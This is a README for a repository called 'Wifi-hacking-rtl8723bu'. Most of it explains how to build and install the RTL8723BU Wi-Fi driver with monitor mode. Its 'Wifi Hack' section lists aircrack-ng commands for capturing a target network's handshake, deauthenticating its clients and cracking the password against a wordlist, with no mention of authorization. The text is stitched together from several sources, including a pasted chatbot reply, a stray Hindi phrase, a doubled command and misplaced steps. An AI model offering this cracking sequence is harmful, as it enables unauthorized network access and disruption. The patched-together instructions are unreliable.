# Wifi-hacking-rtl8723bu

To use your Realtek Semiconductor Corp. RTL8723BU 802.11b/g/n WLAN Adapter with **aircrack-ng**, you may need to install specific drivers that support monitor mode and packet injection. Here's a general guide to help you with the process on a Linux system:

### Step 1: Update Your System

Before installing any drivers, make sure your system is up to date:

```bash
sudo apt update
sudo apt upgrade
```

### Step 2: Install Required Packages

You'll need some essential packages for compiling the driver:

```bash
sudo apt install build-essential dkms git
```

### Step 3: Download and Install the Driver

1. **Download the Driver Source Code**:

   You can find the driver for the RTL8723BU on GitHub. Clone the repository using the following command:

   ```bash
   git clone https://github.com/rehan5039/Wifi-hacking-rtl8723bu.git
   ```

2. **Build and Install the Driver**:

   Navigate to the downloaded directory and build the driver:

   ```bash
   cd Wifi-hacking-rtl8723bu/rtl8723bu-master
   ```

   ```bash
   make
   ```

   ```bash
   sudo make install
   ```

4. **Load the Driver**:

   Once installed, load the driver using:

   ```bash
   sudo modprobe 8723bu
   ```

### Step 4: Enable Monitor Mode

After installing the driver, you can enable monitor mode using the following command:

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

*Note*: Replace `wlan0` with your actual wireless interface name if it's different.

### Step 5: Verify Installation

Verify that your adapter supports monitor mode and packet injection:

### Common Tools Used

1. **airmon-ng**: Enables monitor mode on your wireless interface.
2. **airodump-ng**: Captures packets from the network.
3. **aireplay-ng**: Performs packet injection.
4. **aircrack-ng**: Cracks the password using the captured packets.

   
### Step 6: Wifi Hack

```bash
airodump-ng wlan0
```

```bash
airodump-ng -c [channel] --bssid [BSSID] -w  capture wlan0
```

```bash
aireplay-ng --deauth 10 -a [BSSID] wlan0
```

```bash
aircrack-ng capture.cap -w [wordlist]
```

You should see "Mode:Monitor" next to your wireless interface.

### Troubleshooting

- **Driver Compatibility**: If you face any issues, ensure the driver you are using is compatible with your kernel version.
- **Error Messages**: Check for error messages during the `make` or `make install` process. They can provide clues about what might be going wrong.
- **Reboot**: Sometimes, a simple reboot can help load the necessary drivers correctly.

This should set up your Wi-Fi adapter for use with **aircrack-ng**.


### Another Method

# rtl8723bu
Driver for Realtek RTL8723BU Wireless Adapter with Hardware ID `0bda:b720`

# How to use?
## Get the source first.
Get it from Github repository with the following command in the Linux terminal.
```
git clone https://github.com/rehan5039/Wifi-hacking-rtl8723bu.git
cd Wifi-hacking-rtl8723bu/rtl8723bu-master
```

## Concurrent or Non-Concurrent Mode
By default driver operates the hardware as a station AND as an access point *simultaneously*.  This will show two devices when you run the `iwconfig` command.

If you do not want two devices (station and an access point) *simultaneously*, then follow these instructions.

- Step 1: Run the following command in the Linux terminal. 
```
nano Makefile
```

- Step 2: Find the line that contains `EXTRA_CFLAGS += -DCONFIG_CONCURRENT_MODE` and insert a `#` symbol at the beginning of that line. This comments that line and disables concurrent mode.


## Manual install
Run the following commands in the Linux terminal.

```
make
sudo make install
sudo modprobe -v 8723bu
```
This driver can not work with the standard driver rtl8xxxu, thus you need to blacklist it. Run the following command
...
sudo nano /etc/modprobe.d/50-rtl8xxxu.conf
...
Add a single line: blacklist rtl8xxxu
...
## Automatic install using DKMS
If you don't want to worry about building/installing driver after kernel update, use this scenario. For Ubuntu/Debian install DKMS package using command `sudo apt install dkms`.

Then run following commands in terminal
```
source dkms.conf
sudo mkdir /usr/src/$PACKAGE_NAME-$PACKAGE_VERSION
sudo cp -r core hal include os_dep platform dkms.conf Makefile rtl8723b_fw.bin /usr/src/$PACKAGE_NAME-$PACKAGE_VERSION
sudo dkms add $PACKAGE_NAME/$PACKAGE_VERSION
sudo dkms autoinstall $PACKAGE_NAME/$PACKAGE_VERSION
```

### Steps to Ensure Correct Driver Use:
To ensure you're using the correct driver:

- **Blacklist the Default Driver:**
  To prevent the default `rtl8xxxu` driver from loading, create a blacklist file:

  ```bash
  echo "blacklist rtl8xxxu" | sudo tee /etc/modprobe.d/rtl8xxxu.conf
  ```

- **Rebuild and Reload Driver:**
  Ensure you are in the `rtl8723bu` directory and rebuild the module:

  ```bash
  make clean
  make
  sudo make install
  sudo modprobe 8723bu
  ```

- **Verify the Driver:**
  After loading the module, verify the driver in use:

  ```bash
  iwconfig
  ```
  

### Steps to Resolve the Issue

To proceed with using `aircrack-ng`, you'll want to stop these processes to prevent interference:

1. **Stop Interfering Processes**:

   Use `airmon-ng` to check for interfering processes and kill them:

   ```bash
   sudo airmon-ng check kill
   ```

   This command will stop `NetworkManager` and `wpa_supplicant`, which might be putting the interface back to managed mode.

2. **Enable Monitor Mode**:

   Now that the interfering processes are stopped, put the interface in monitor mode again using:

   ```bash
   sudo airmon-ng start wlan0
   ```

3. **Verify Monitor Mode**:

   You can verify that the interface is in monitor mode by checking with:

   ```bash
   iwconfig
   ```

   It should display `Mode:Monitor` next to `wlan0`.

4. **Use Aircrack-ng**:

   Now you can use tools like `airodump-ng` and `aireplay-ng` to start your wireless security testing:

   ```bash
   sudo airodump-ng wlan0
   ```

5. **Restart Services**:

   Once you are done using monitor mode, you can restart the services to restore normal wireless functionality:

   ```bash
   sudo systemctl restart NetworkManager
   ```

This process should enable you to use your RTL8723BU Wi-Fi adapter with `aircrack-ng` for network security testing.

It seems like you're trying to install and compile the Realtek RTL8723BU wireless driver on Kali Linux. Here are the steps to ensure the installation process is completed successfully:

1. **Update Your System:** You've already done this, but it's always good to start with:
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

2. **Install Necessary Packages:** You need to install `dkms`, `build-essential`, `libelf-dev`, `linux-headers-$(uname -r)`, and `git`, which you've also done:
   ```bash
   sudo apt install dkms build-essential libelf-dev linux-headers-$(uname -r) git -y
   ```

3. **Clone the Driver Repository:**
   You correctly cloned the repository using:
   ```bash
   git clone git clone https://github.com/rehan5039/Wifi-hacking-rtl8723bu.git
   ```

4. **Change Directory to the Cloned Repository:**
   ```bash
   cd Wifi-hacking-rtl8723bu/rtl8723bu-master
   ```

5. **Compile the Driver:**
   You've started this process with `make`. If you're seeing warnings but no errors, the compilation is likely proceeding correctly. Warnings don't necessarily indicate a failure to compile but point out potential issues in the code that aren't critical:
   ```bash
   make
   ```

6. **Install the Driver:**
   After successful compilation, install the module with:
   ```bash
   sudo make install
   ```

7. **Load the Driver:**
   Insert the compiled module into the Linux kernel:
   ```bash
   sudo modprobe 8723bu
   ```

8. **Reboot the System:**
   To ensure changes take effect, reboot your machine:
   ```bash
   sudo reboot
   ```

9. **Verify the Installation:**
   After rebooting, check if the wireless interface is up:
   ```bash
   ip link show
   ```
   Look for a wireless interface (like `wlan0` or similar).
   
### Step 10: Auto-Load the Driver on Boot
Ensure karein ki driver automatically boot par load ho:

```bash
echo "8723bu" | sudo tee -a /etc/modules
```
